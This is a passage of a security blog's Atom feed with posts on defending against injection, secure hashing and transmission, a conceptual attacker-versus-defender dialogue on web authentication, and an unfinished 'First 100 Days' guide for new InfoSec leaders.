<p><strong>Parameterized Statements</strong>  interact with the command processor to separate
the variables from the SQL query, thus effectively neutralizing characters
that may influence the query.</p>

<p><img src="https://securesql.info/images/simple9.png.avif" alt="" /></p>

<p>In Java this can be achieved by using a <strong>Prepared Statement  **as per the
example below</strong>.  **The question mark in the query string at line 3 is a
placeholder for the parameter value.</p>

<p><img src="https://securesql.info/images/simple10.png.avif" alt="" /></p>

<p>When dealing with OS Commands, is best to avoid them completely and write the
equivalent functionality in your programming language of choice. For example
if you must read a file in Java use APIs such as <strong>File</strong>  and
<strong>BufferedReader  **rather than the Linux **cat</strong>  command. However in certain
cases there’s no choice and the code must <strong>“Shell Out”</strong>. For those
situations the equivalent of a **Prepared Statement  **is passing command line
arguments as a separate array, thus avoiding concatenation.</p>

<p><img src="https://securesql.info/images/simple11.png.avif" alt="" /></p>

<h1 id="object-relational-mapping-orm">Object-Relational Mapping (ORM)</h1>

<p>There’s an even better way to abstract SQL statements from application code.
ORM frameworks allow developers to work with objects rather than SQL queries.
Instead of working with the <strong>users</strong>  table developers would work with a
users collection and execute a method on that collection to return the
corresponding record.</p>

<p><img src="https://securesql.info/images/simple12.png.avif" alt="" /></p>

<p>Under the covers the framework would perform a transformation similar to the
diagram below.</p>

<p><img src="https://securesql.info/images/simple13.png.avif" alt="" /></p>

<h1 id="caution">Caution</h1>

<p>There are cases where <strong>Injection</strong>  will still occur in spite of
<strong>Parameterized Statements</strong>  being used. For example when the injection
occurs in a database stored procedure or the OS shell script being executed</p>

<p>In order to reduce the likelihood of such scenarios occurring, <strong>Input
Validation</strong>  should still be used as much as possible.</p>

<h1 id="to-sum-it-all-up">To sum it all up</h1>

<p>When reviewing a code change that involves a command processor look for the
following:</p>

<ul>
  <li>
    <p><strong>Input Validation</strong>  for known alphanumeric values</p>
  </li>
  <li>
    <p>Employing <strong>Parameterized Statements</strong></p>
  </li>
  <li>
    <p>Using a <strong>ORM framework</strong>  where applicable</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Injection"/>
    <category term="SQL Injection"/>
    <category term="Input Validation"/>
    <category term="Parameterized Statements"/>
    <category term="ORM"/>
    <category term="Secure Coding"/>
    <category term="Code Review"/>
    <summary type="html"><![CDATA[Notice that the single quote in the name O’Brien is causing a syntax error. The SQL command processor considers the string ends]]></summary>
  </entry>
  <entry>
    <title type="html">Overly Simplistic Crypto Code review</title>
    <link href="https://www.securesql.info/2018/09/05/crypto-code-review/" rel="alternate" type="text/html" title="Overly Simplistic Crypto Code review"/>
    <published>2018-09-05T00:00:00-07:00</published>
    <updated>2018-09-05T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2018/09/05/crypto-code-review</id>
    <content type="html" xml:base="https://www.securesql.info/2018/09/05/crypto-code-review/"><![CDATA[<p>Confidentiality is one of Information Security’s CIA tenets. Users entrust
developers with their data. To earn and maintain their trust, we must employ
security controls that protect data from unauthorized access.</p>

<p>Unfortunately the track record is not good. The number of user records exposed
in the United States has been in the billions in 2016 and 2017. 2018 will
likely be the same, once the final tally is calculated.</p>

<p><img src="https://securesql.info/images/1.jpg" alt="" /></p>

<p>It is worth mentioning that not all of these breaches were caused by
programming flaws. Some were caused by negligence, many were caused by
phishing and malware attacks.</p>

<p>However at least one of the breaches of 2017 was caused by a programming flaw.
The breach at the credit rating company Equifax was responsible for almost 10%
of the damage: 146 million records. The attack leveraged a OGNL Injection
vulnerability in the Apache Struts library and the subsequent failure to patch
the affected systems. You can read about Injection flaws in one of the
previous articles in this series.</p>

<h2 id="spotting-data-breaches-during-code-review">Spotting Data Breaches During Code Review</h2>

<p>Besides vulnerabilities in 3rd party components, there are programming flaws
that specifically involve storage and transmission of data and they may be
prevented during code review. They are as follows:</p>

<ul>
  <li>
    <p>Cleartext Storage of Sensitive Information — CWE 312</p>
  </li>
  <li>
    <p>Use of a One-Way Hash without a Salt — CWE 759</p>
  </li>
  <li>
    <p>Cleartext Transmission of Sensitive Information — CWE 319</p>
  </li>
  <li>
    <p>Use of a Broken or Risky Cryptographic Algorithm — CWE 327</p>
  </li>
</ul>

<p>We will review a few examples of these flaws and how they can be prevented
through software security best practices.</p>

<h2 id="uniquely-identifying-data-without-knowing-the-data">Uniquely Identifying Data Without Knowing the Data</h2>

<p>One of the strongest countermeasures that can be employed to prevent data
breaches is not storing the data at all.</p>

<p>But what if you still need to work with the data? For example, what if you
wanted to verify a user’s password without storing the actual password value?</p>

<p>You could transform the data in a non-reversible way. This can be done through
a cryptographic operation known as hashing.</p>

<p>Hashing algorithms, such as the SHA-2 class of algorithms, convert data in a
way that cannot be reversed. However this doesn’t prevent one from trying a
large amount of possible values in order to reach the same outcome. This is
known as cracking. Cracking takes a long time and requires a lot of computing
resources. Hackers maintain lists of pre-computed hashes, known as rainbow
tables, in order to avoid the computing cost.</p>

<p><img src="https://securesql.info/images/2.png.avif" alt="" /></p>

<p>The defence employed against rainbow tables is to complicate the calculation
by adding a <em>salt</em>. A <em>salt</em>  is a random value that is added to the data
being transformed in order to alter the resulting hash.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ABCDEFG" + "-32524..." -&gt; sha256("ABCDEFG-32524...") -&gt; 97AF3... 
</code></pre></div></div>

<p>Another defence against cracking is adaptive hashing. This involves re-hashing
the data for a large amount of iterations, each iteration taking longer than
the previous. This increases the computing time. For a single hash the time is
negligible but for a cracking attack it results in millions of years. A
largely adopted adaptive hashing algorithm is PBKDF2.</p>

<p>Let’s take a look at the following code snippets. Can you spot the security
flaw?</p>

<p><img src="https://securesql.info/images/3.png.avif" alt="" /></p>

<p>If you identified the top example as being flawed you were correct. The top
example requires the user password stored as is. The bottom application is
storing the data hashed several times to increase computing time and is also
using a salt.</p>

<p>Secure hashing may be employed for various other types of data. For example if
an application needs to uniquely identify users for analytics purposes, it
could construct a unique, non-reversible hash from the user name and their IP
address. This process is known as Tokenization.</p>

<p>If the website analytics database is breached and the only thing obtained by
the attackers are these hashes, the data is useless to them or too costly to
reverse. However if the database contains user names and IPs and if the user
names are actual e-mails (a practice employed by many sites), then e-mails
will be sold on the dark web to be used for phishing and spam campaigns.</p>

<h2 id="securing-the-transmission-of-data">Securing the Transmission of Data</h2>

<p>Hashing can be an effective way to secure the data, but what if the attacker
is able to intercept the data before it is transformed? What if they can
intercept the data even before it reaches the application?</p>

<p>Up until 2018 major news outlets such as CNN or FOX NEWS were accessible over
unencrypted URLs. Those are site addresses that start with <code class="language-plaintext highlighter-rouge">http://</code> .</p>

<p>One of the things that may have prompted many sites to change this behaviour
was the addition of a <strong>Not Secure</strong>  message to the address bar of the
popular Google Chrome browser for all <code class="language-plaintext highlighter-rouge">http://</code> addresses.</p>

<p><img src="https://securesql.info/images/4.png.avif" alt="" /></p>

<p>When a website uses clear text to communicate with its users, <em>man-in-the-
middle</em>  attacks are possible. These attacks are can be online or offline
attacks. Offline attacks usually target the Confidentiality of the data, for
example tracking a user’s activity online or stealing their credentials.
Online attacks can also impact the Integrity of the data, like for example
replacing the content of a trusted news outlet with malware.</p>

<p>Communication security protocols, indicated by <code class="language-plaintext highlighter-rouge">http**s** ://</code> URLs, prevent
<em>man-in-the-middle</em>  attacks by encrypting the transmission and verifying the
identity of the two parties involved in the communication.</p>

<p>There are many details to transmission security that may be better covered in
a dedicated article, but we will focus primarily on one aspect that may come
up during a code review. This is using <code class="language-plaintext highlighter-rouge">http**s** ://</code> URLs.</p>

<p>Let’s take a look at a code example. Can you spot the code that transmits data
insecurely?</p>

<p><img src="https://securesql.info/images/5.png.avif" alt="" /></p>

<p>If you identified the bottom example as insecure you were correct. Notice that
the URL is prefixed with <code class="language-plaintext highlighter-rouge">http://</code> meaning that the data is transmitted in
clear text. Looking a bit to the right you can spot two pieces of sensitive
information being transmitted in the URL.</p>

<p>Note that is bad practice to store sensitive information in the URL even if
the url starts with <code class="language-plaintext highlighter-rouge">https://</code> . Thats’s because the URL may be inadvertently
bookmarked, sent to a 3rd party or stored in web server logs.</p>

<p>Sometimes developers change the code to ignore invalid certificates because
the test environment they are using does not have a valid web server
certificate. This is a bad practice because it practically violates the server
identity verification and allows _  man-in-the-middle _attackers to pretend
they are the target website. It is recommended to configure the development
environment to trust the test certificate instead of altering the program
behavior.</p>

<h2 id="reversible-encryption">Reversible Encryption</h2>

<p>What if you must be able to work with the user data in clear text? For
example, you operate an online shopping or other financial site and must store
the user’s name, address and credit card information to process transactions.</p>

<p>First, I would like to emphasize that if this is the case, the site has a huge
target painted on it. It is likely subject to daily attacks. This is likely
the case for sites like Equifax or your banking site.</p>

<p>Unfortunately encryption would have not saved Equifax because the
vulnerability allowed attackers to run code on the web site. This let the
attackers make the web site do their bidding. Another thing that helped the
attackers is that the breach was not observed for a long period of time,
allowing them to exfiltrate information as users were interacting with the
website.</p>

<p>However let’s say the attackers don’t have this kind of access, but they have
access to the physical hard drive of the database server. A different common
attack vector could be a SQL Injection vulnerability that allows attackers to
alter the database queries in order to expose sensitive data.</p>

<p>In these cases encryption can be effective, provided that the attackers cannot
retrieve the encryption keys. If encryption keys are stored on a separate
server, also known as a Key Management Server or Service (KMS), then attackers
must obtain access to this server as well, which complicates the attack.
However if the encryption keys are stored in the same database, decrypting the
data is trivial. This scenario is similar to <em>hiding a key under the mat.</em></p>

<p>Let’s take a look at some code examples written in Node.js. Can you identify
the vulnerable snippet?</p>

<p><img src="https://securesql.info/images/6.png.avif" alt="" /></p>

<p>If you identified the top example you are correct. The top example is storing
the customer personal financial information in a AWS S3 bucket. S3 buckets
have notoriously been exposed to data breaches in the past years. While S3
offers data encryption capabilities, this configuration may not be enabled and
it does not protect from all types of attacks.</p>

<h2 id="to-sum-it-all-up">To sum it all up</h2>

<p>Some key takeaways from this article:</p>

<ul>
  <li>
    <p>Where possible employ secure hashing to transform the data in a way that cannot be reversed</p>
  </li>
  <li>
    <p>Enforce secure communication between clients and servers</p>
  </li>
  <li>
    <p>Encrypt sensitive data in databases to prevent physical data theft and mitigate SQL Injection</p>
  </li>
  <li>
    <p>Store encryption keys in a KMS</p>
  </li>
  <li>
    <p>Vulnerabilities that allow code execution on the server may still expose the data in spite of encryption, so all secure coding practices are data protection practices.</p>
  </li>
</ul>

<p>Due to the extensive nature of the data protection subject we are going to
stop here for now. In the next article we will cover how to keep up to date
with crypto algorithms, what are some of the government and compliance
standard requirements for data protection and how do they affect coding.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cryptography"/>
    <category term="Secure Coding"/>
    <category term="Data Protection"/>
    <category term="Code Review"/>
    <category term="Encryption"/>
    <category term="HTTPS"/>
    <category term="Hashing"/>
    <category term="Security Best Practices"/>
    <summary type="html"><![CDATA[Confidentiality is one of Information Security]]></summary>
  </entry>
  <entry>
    <title type="html">For those who wonder what a Digital authentication cyber arms race looks like</title>
    <link href="https://www.securesql.info/2018/07/11/silly-threat-modeling/" rel="alternate" type="text/html" title="For those who wonder what a Digital authentication cyber arms race looks like"/>
    <published>2018-07-11T00:00:00-07:00</published>
    <updated>2018-07-11T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2018/07/11/silly-threat-modeling</id>
    <content type="html" xml:base="https://www.securesql.info/2018/07/11/silly-threat-modeling/"><![CDATA[<p>It is heavy on the technical content but is entertaining if you spend the time
understanding the language.</p>

<blockquote>
  <p>“Defender: Users will enter a username &amp; password, and I will give them an
authentication cookie for me to trust in the future.<br />
Attacker: I will watch your network traffic and steal the passwords as they
come down the wire.<br />
Defender: I will change the html form to submit over HTTPS, so you won’t see
any readable passwords.<br />
Attacker: I will run an active MITM attack as the user loads the login page,
and insert Javascript that sends the password to my server in the
background.<br />
Defender: I will serve the login page itself over HTTPS too, so you won’t be
able to read or change it.<br />
Attacker: I will watch your network traffic and steal the resulting
authentication cookies, so I can still impersonate users even without
knowing the password.<br />
Defender: I will serve the entire site over HTTPS (and mark the cookie as
Secure), so you won’t be able to see any cookies.<br />
Attacker: I will run an active MITM attack against your entire site and
serve it over HTTP, letting me see all of your traffic (including passwords
and cookies) again.<br />
Defender: I will serve a Strict-Transport-Security header, telling the
browser to always refuse to load my site over HTTP (assuming the user has
already visited the site over a trusted connection to establish a trust
anchor).<br />
Attacker: I will find or compromise a shady certificate authority and get my
own certificate for your domain name, letting me run my MITM attack and
still serve HTTPS.<br />
Defender: I will serve a Public-Key-Pins header, telling the browser to
refuse to load my site with any certificate other than the one I specify.</p>

  <p>At this point, there is no reasonable way for the attacker to run an MITM
attack without first compromising the browser.</p>

  <p>Attacker: I will make a fake login page and phish users for passwords.<br />
Defender: I will add two-factor authentication, making your stolen passwords
useless without the non-reusable second factor.<br />
Attacker: I will change my phishing page to request a second factor as well,
then immediately use it to log in once. (this will give the attacker a
single login session with no way of logging in again, but that is often
enough to cause harm)<br />
Defender: I will replace my SMS or TOTP second factor with a private key on
a tamper-resistant hardware device, rendering an MITM attack completely
unable to use the stolen credential (the private key is used to sign a
challenge from the server, and never leaves the device). This also prevents
phishing attacks, since the browser will incorporate the site origin into
the challenge signed by the private key, and will refuse to send a challenge
signed for the defender’s server to any other origin. This is only possible
because the browser actively cooperates, unlike purely web-based solutions
like SQRL.</p>

  <p>Private keys, such as U2F devices, are unphishable credentials; it is now
completely impossible for anyone who does not have physical posession of the
private key to authenticate. Note that this assumes that the hardware device
is trusted; if the attacker can swap the device for a device with a known
private key, all bets are off. Also note that you should still use a
password in conjuction with the hardware device, to prevent an attacker from
simply stealing the device (if the device itself requires a password to
operate, that’s also fine).</p>

  <p>Attacker: I will trick the user into installing a malicious browser
extension or desktop application, then use it to read the authentication
cookie from the browser’s cookie jar.<br />
Defender: I will use channel-bound cookies, linking my authentication cookie
to the private key used to generate the SSL connection. This way, the
authentication cookie will only work in an HTTPS session backed by the same
private key, preventing the attacker from using it on his computer.<br />
Attacker: I will change my malicious code to exfiltrate the private key as
well as the authentication cookie, allowing me to completely clone the SSL
connection on my machine, and still use the cookie.<br />
Defender: I will hope that the user’s browser signs its HTTPS connections
with a hardware-based private key (hardware-backed token binding),
preventing the attacker from cloning the SSL session without access to that
private key (which never leaves the hardware device).<br />
Attacker: I will change my malicious code to run a reverse proxy through the
user’s browser, sending my arbitrary requests through the same token-bound
SSL session as the user’s actual requests.<br />
Defender: I will encourage users to use a platform &amp; browser that does not
allow processes or extensions to interact with security contexts for other
origins. This way, the attacker’s malicious code will not be able to read my
cookies or send requests to my site.</p>

  <p>Assuming no application-level vulnerabilities (such as XSS or CSRF), and no
vulnerabilities in the platform itself, such a platform would be completely
secure against any kind of attack. Unfortunately, I am not aware of any such
platform that also supports unphishable credentials. Chrome OS supports
unphishable credentials, but offers no way to prevent extensions from
sending HTTP requests to your origin. Most mobile browsers (on non-rooted
devices) do not support extensions at all, but do not currently support
unphishable credentials.”</p>
</blockquote>

<p>– Laks</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Authentication"/>
    <category term="Cybersecurity"/>
    <category term="Browser Security"/>
    <category term="Phishing"/>
    <category term="Digital Identity"/>
    <category term="Hardware Tokens"/>
    <category term="Defense Strategies"/>
    <summary type="html"><![CDATA[It is heavy on the technical content but is entertaining if you spend the time understanding the language.]]></summary>
  </entry>
  <entry>
    <title type="html">First 100 Days</title>
    <link href="https://www.securesql.info/2018/04/30/first-100-days/" rel="alternate" type="text/html" title="First 100 Days"/>
    <published>2018-04-30T00:00:00-07:00</published>
    <updated>2018-04-30T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2018/04/30/first-100-days</id>
    <content type="html" xml:base="https://www.securesql.info/2018/04/30/first-100-days/"><![CDATA[<p>A friend took up a new InfoSec executive career path but didn’t know how to
start.  She reached out to me and ask for my thoughts.  I thought about it and
came up with 40 page essay on items and deliverables. Once I realized what I
constructed, it would take half a day to explain each item. Why not make it
succinct and distribute it at large? While discussing the rewritten draft, we
had interesting, authentic discussions on what is achievable for various
security programs in their first 100 days.  The information below is drawn
from lessons learned, applied knowledge / experiments, personal notes sold to
researchers, and old college courses on organizational theory.</p>

<p>Below is a straw-man for a generic security programs.  The content is
structured to be easily tailored for Blue Team, Red Team, Purple Team, AppSec,
OpsSec, IT Sec, PhySec, etc..  As one might imagine, Blue Team is not going to
know when to run static source code analysis nor when to provide feedback.
Just as PhySec will only know how to secure physical assets and introduce
tamper-evident seals to shredders.</p>

<p><strong><em>About</em></strong></p>

<p>How one performs in their first 100 days is critical to their career’s success
or failure.. The 100 days is a honeymoon period to formulate a course of
action, make connections, establish relationships, and communicate a personal
mgt. style.  This honeymoon is critical to establish oneself and create basic
perceptions others will associate with subsequent plans and actions.  I break
down the first 100 days into six phases, each overlapping with recommended
durations.  It is expected this model will not fit all organizations.  Chaotic
organizations may require lighter, friction-less heavily-technical-laden
touches within smaller time periods.  Mature organizations will have their own
model and work within the scale of years.</p>

<p><strong><em>The desired agenda</em></strong></p>

<ul>
  <li>
    <p>Starts prior to the Hire Date</p>
  </li>
  <li>
    <p>Focus on subset of priorities and drive actions to near-term improves (easy wins)</p>
  </li>
  <li>
    <p>Bridge delivery of business value and internal program excellence</p>
  </li>
  <li>
    <p>Forge respectable relationships with stakeholders (Finance, Legal, Ops, Support, Engineering, Infrastructure, etc.…)</p>
  </li>
  <li>
    <p>Establish a baseline which become the foundation to measure against (if one didn’t exit prior)</p>
  </li>
  <li>
    <p>Communicate the program’s compelling future</p>
  </li>
  <li>
    <p>Highlight future opportunities while encouraging to learn from past mistakes</p>
  </li>
  <li>
    <p>Define and communicate realistic and measurable, time-bound goals, and establish tracking systems to check when goals are achieved</p>
  </li>
  <li>
    <p>Provide your mgr. creditability and elevate the image of the program, department, and organization</p>
  </li>
</ul>

<hr />

<h1 id="the-six-phases">The Six Phases</h1>

<h2 id="preparation-makes-permanent">Preparation makes Permanent</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Take key actions to inform yourself.  Learn about your directs / indirects, peers, staff, and draft communications for Day 1.
</code></pre></div></div>

<h2 id="assess">Assess</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Gain comprehensive insight into the current state of the program
</code></pre></div></div>

<h2 id="plot">Plot</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Synthesizes the long assess phase into areas of focus.  Leading to the transformation of everything you learned into a blueprint
</code></pre></div></div>

<h2 id="execution">Execution</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Delivers visible results. Focus on the two key issues identified per the interim program strategy, but seek to address the other foundational areas
</code></pre></div></div>

<h2 id="measurement">Measurement</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Start providing evidence of your impact.  The overlap with the Execution phase provides the opportunity for feedback so that Execution phase activities and deliverables may be adjusted – ensuring the desired, repeatable, predictable results
</code></pre></div></div>

<hr />

<h1 id="preparation-makes-permanent--15-15">Preparation makes Permanent (-15-15)</h1>

<h2 id="before-hire-date">Before Hire Date</h2>

<p>** <em>Outcome</em>**</p>

<ul>
  <li>
    <p>An arrangement and understanding of role, expectations of you – among yourself, management, senior stakeholders, and new staff</p>
  </li>
  <li>
    <p>Glean management philosophies and approaches</p>
  </li>
  <li>
    <p>Set understanding of your management philosophies and approaches to directs / indirects</p>
  </li>
</ul>

<p><strong><em>Soft Skills to Brush Up</em></strong></p>

<p>Communication skills</p>

<ul>
  <li>
    <p>Business language – use technical language as appropriate to the correct audiences</p>
  </li>
  <li>
    <p>Clear, concise and consistent messages (as they are interpreted, not communicated) in forums and across listeners / readers</p>
  </li>
  <li>
    <p>Focus on what is specific to the org.’s performance</p>
  </li>
  <li>
    <p>Connect specific plans to the orgs.’s strategies and investments</p>
  </li>
  <li>
    <p>Socialize plans to peers and leadership with active solicitation</p>
  </li>
  <li>
    <p>Write a 100 word or less short bio.  Neutral messaging, no spin.  Key priorities at work, personal life, values, and integrity.</p>
  </li>
</ul>

<p>Business and Technical owner discussions prep</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            5 or less questions – open and specific.  Attempt to yield insightful conversation beyond shaking hands “What is your perception and satisfaction level on the current state of X program and organization?”  Then you will be expected to resolve them as quickly as possible according to them.  Typically their priorities, general expectations, and chronic pain / suffering or useless roadblocks
</code></pre></div></div>

<p>Staff</p>

<ul>
  <li>
    <p>Similar questions for directs and indirects as above</p>
  </li>
  <li>
    <p>Key work challenges, constraints, perceptions, and satisfaction within team, department, org., and business unit</p>
  </li>
</ul>

<h2 id="on-first-hire-date">On First Hire Date</h2>

<p>Key Communication Opportunities</p>

<ul>
  <li>
    <p>Meet and Greet</p>
  </li>
  <li>
    <p>Outcomes – approachable and available.  The walk away - still gathering information and not ready to make decisions or changes.  No opinions offered at this time.</p>
  </li>
  <li>
    <p>Structure</p>

    <ul>
      <li>
        <p>Intro prior intro-message drafted in advance.  State when you will report back to the team on updates</p>
      </li>
      <li>
        <p>Team self-introductions in any manner of their choosing and ask any question of their choosing. Nothing off limits</p>
      </li>
      <li>
        <p>Remember a detail about each person</p>
      </li>
      <li>
        <p>Be cognizant of biases (political, generational, social, etc..) which may remain from predecessors</p>
      </li>
      <li>
        <p>No need to come on strong (ensure not to appear so.)  Do not appear as a threat</p>
      </li>
      <li>
        <p>With one-two-ones with directs (and eventual indirects) – what are the concerns, priorities, career aspirations.  Which one understand and can describe the big pictures?  Which are caught in a mud hole or silo?  Where or who needs immediate help?</p>
      </li>
      <li>
        <p>Publish Meet and Greet notes with the wider organization (as appropriate)</p>
      </li>
    </ul>
  </li>
</ul>

<p><strong><em>Specific, Measurable, Attainable, Relevant, and Timely Actions</em></strong></p>

<ul>
  <li>
    <p>Logistics – Work with HR and other representatives to setup meet and greets on the first day.  This will help set the tone from day 1 about productivity and expect the same from others</p>
  </li>
  <li>
    <p>Org. Structure – Grab org charts and learn as much lore about the movers, shakers, and levers within the organization and specifically within Finance, Legal, Ops, Engineering, Support, and Security (Info, App, GRC, Ops, SecOps, Red, and Physical.)  Make sure to mark the untouchables</p>
  </li>
  <li>
    <p>Key Players – Work with supervisor to maintain a list of key players to meet with the first week</p>
  </li>
  <li>
    <p>New Connections – Thank you notes to interview team.  Setup a few lunches with said party</p>
  </li>
  <li>
    <p>Program specific action items – Based upon the needs of the business and organization.  Each institution is different as is their programs</p>
  </li>
</ul>

<p>Last – Regroup with manager.  Cover key challenges and opportunities from your
POV.  Prelim strategic vision.  Future communication schedule, one-two-one
expectations, and other manager / report relationship items</p>

<hr />

<h1 id="assess-0-30">Assess (0-30)</h1>

<p><strong><em>Outcome</em></strong></p>

<ul>
  <li>
    <p>Insight into current state of X program</p>
  </li>
  <li>
    <p>What is working and not working?</p>
  </li>
  <li>
    <p>Top five challenges which are prioritized for the first 2-3 months</p>
  </li>
</ul>

<p>Key Communication Opportunities</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Meet team leads within your program
</code></pre></div></div>

<ul>
  <li>
    <p>Opinions on state</p>
  </li>
  <li>
    <p>Informed opinions on urgent tasks and coach the leads on how to approach them</p>
  </li>
  <li>
    <p>Solicit input from leads and support them to make it clear you can’t achieve anything alone</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Stakeholders

                        Grab the preselect top key stakeholder list and meet with three of them
</code></pre></div>    </div>
  </li>
  <li>
    <p>Acquire opinions on current program and any changes they might suggest</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                        From the key stakeholder list, actively engage with pivotal business leaders.  May need to pull from Executive Security Cell team. 
</code></pre></div>    </div>
  </li>
  <li>
    <p>They will understand you will put their business needs first as you craft and execute your plans.  This will help cement crucial relationships.</p>
  </li>
  <li>
    <p>Start off with an open and cooperative relationship.  Grab their objectives and concerns with the X program function.  Ask advice and write down their answers in front of them.  More than likely, they will give you a roadmap to handle their immediate and long term needs</p>
  </li>
</ul>

<p>Identify the movers and shakers</p>

<ul>
  <li>These influencers will help you avoid being a lone voice trying to initiate cultural change</li>
</ul>

<p><strong><em>Specific, Measurable, Attainable, Relevant, and Timely Actions</em></strong></p>

<ul>
  <li>
    <p>Document findings – succinct report to mgr. and other individuals mgr. may care to collaborate with</p>
  </li>
  <li>
    <p>Artifact gathering – Recent steering committee meetings minutes (IA, Board, Security Cell, Executive, Engineering, Legal, Ops, Finance, Support, etc.…)Grab the last two years’ worth of compliance / GRC artifacts (reports, ERM, Role’s risk artifacts, SSAE SAS70 / SOC 123, Report on Controls, Pentests, Tooling reporting (static source code analysis, dynamic testing – black, white, and grey), Code repository metrics, IP metrics (cyclomatic complexity, ELOC, etc.…), architectural diagrams, Vuln. Mgt. reports, SecOps incidents, etc.…</p>
  </li>
  <li>
    <p>Loosely memorize infosec documentation – policies, assurances, procedures (if you are lucky), mechanisms, charters, principles, strategies, program plans, roadmaps, etc.…</p>
  </li>
  <li>
    <p>Request materials available on the actual expenses and capital spending activities.  If the organization is mature, try to grab forecasting datasets.</p>
  </li>
  <li>
    <p>Program specific action items – Based upon the needs of the business and organization.  Each institution is different as is their programs</p>
  </li>
</ul>

<p>Last – Reset? Or set expectations with manager and the role’s authority as it
relates with in the institution</p>

<hr />

<h1 id="plot-15-45">Plot (15-45)</h1>

<p><strong><em>Outcome</em></strong></p>

<ul>
  <li>
    <p>Planned budget for the next 3-4 months</p>
  </li>
  <li>
    <p>Program vision draft</p>
  </li>
  <li>
    <p>An interim strategy for 6-12 months – which identifies two key issues over the next 2-3 months.  It is expected to change so do not spend much time in this area for chaotic organizations</p>
  </li>
</ul>

<p>Key Communication Opportunities</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            Program Vision Draft
</code></pre></div></div>

<ul>
  <li>
    <p>Clear, succinct vision.  Frameworks which fit the culture may be appropriate.  BSIMM, ISO, NIST, NIST CSF, etc.…. will suffice.  They will assist as a planning guide and executive communications.  Draft and share with directs / indirects, all expected stakeholders – solicit their input</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Interim Program Strategy
</code></pre></div>    </div>
  </li>
  <li>
    <p>Where do we wish to be?</p>
  </li>
  <li>
    <p>Where are we?</p>
  </li>
  <li>
    <p>Gap Analysis between the top two questions.   The outcome will be a list of current and new projects.</p>
  </li>
</ul>

<p><strong><em>Specific, Measurable, Attainable, Relevant, and Timely Actions</em></strong></p>

<ul>
  <li>
    <p>Program Vision Draft</p>
  </li>
  <li>
    <p>Interim Program Strategy</p>
  </li>
  <li>
    <p>Grab other departments strategy and budget documents – great insight into the rigor, structure, and expected level of strategic planning within the institution</p>
  </li>
  <li>
    <p>Ensure to grab prior program strategy documents / budgets – Works great to frame discussions on what worked and didn’t work with stakeholders</p>
  </li>
  <li>
    <p>Acquire the related departments’ plotting principles and guidelines to allow you to align to business requirements while planning and plotting</p>
  </li>
</ul>

<p>Last – None</p>

<hr />

<h1 id="execution-15-45">Execution (15-45)</h1>

<p><strong><em>Outcome</em></strong></p>

<ul>
  <li>
    <p>If applicable, draft program charter</p>
  </li>
  <li>
    <p>Publication of interim program strategy – ensure to include the key issues identified earlier</p>
  </li>
  <li>
    <p>Closer relationships with peers and upper mgt…</p>
  </li>
  <li>
    <p>Initiation of the rest of work required to establish technical and business creditability and foundations for the program (includes budget)</p>
  </li>
</ul>

<p>Key Communication Opportunities</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            If applicable, Program Charter Draft
</code></pre></div></div>

<ul>
  <li>
    <p>Establishes formal accountabilities and “executive” mandates.  Try to write it for 3 years.  But realistically will change in a few months due to unforeseen incidents or stakeholder turnover in reactive organizations.  No jargon.  Avoid specific trends or silver bullets.  Simple, succinct phrases “To protect and server,”  “Like water out of a tap,” “track all Production IP deployments,” “Each portfolio application will receive X attention,” etc.…</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Team and one-two-ones
</code></pre></div>    </div>
  </li>
  <li>
    <p>Ask to review their scope and to consider their performance metrics.  Objectives will be clear and scope well-defined.  ASK WHAT YOU CAN DO TO MAKE THEM SUCCESSFUL and follow through!  Work to find practical alternatives when expectations do not meet reality.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Schedule and conduct monthly team updates
</code></pre></div>    </div>
  </li>
  <li>
    <p>The monthly timetable will depend on the culture and rate of change within an organization.  May be monthly.  Could be shorter.  Could be longer.</p>
  </li>
  <li>
    <p>Consistent measurements of the teams.  Standard update report from leads will give everyone the opportunity to glean what their peers are up to and pass that to their reports.  May not be needed for small organizations or chaotic orgs.  Ensure to keep the meeting to less than 21 minutes.  Gives the teams a sense of ownership and pride while increasing their confidence and public speaking skills.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Quarterly Upper Mgt. Updates
</code></pre></div>    </div>
  </li>
  <li>
    <p>Listen to their questions.  Try not to let them wander like Directors will do at a Board meeting or analysts in an individual contributor meeting.</p>
  </li>
  <li>
    <p>Follow a consistent format</p>

    <ul>
      <li>
        <p>What did you say you were going to do this period?</p>
      </li>
      <li>
        <p>What did you accomplish?</p>
      </li>
      <li>
        <p>What is the business value in relation to the accomplishments?</p>
      </li>
      <li>
        <p>What business value would the executive team like to see delivered in the next period?</p>
      </li>
    </ul>
  </li>
</ul>

<p><strong><em>Specific, Measurable, Attainable, Relevant, and Timely Actions</em></strong></p>

<ul>
  <li>
    <p>Team effectiveness coaching and leadership</p>

    <ul>
      <li>
        <p>Give leads their first assignment</p>
      </li>
      <li>
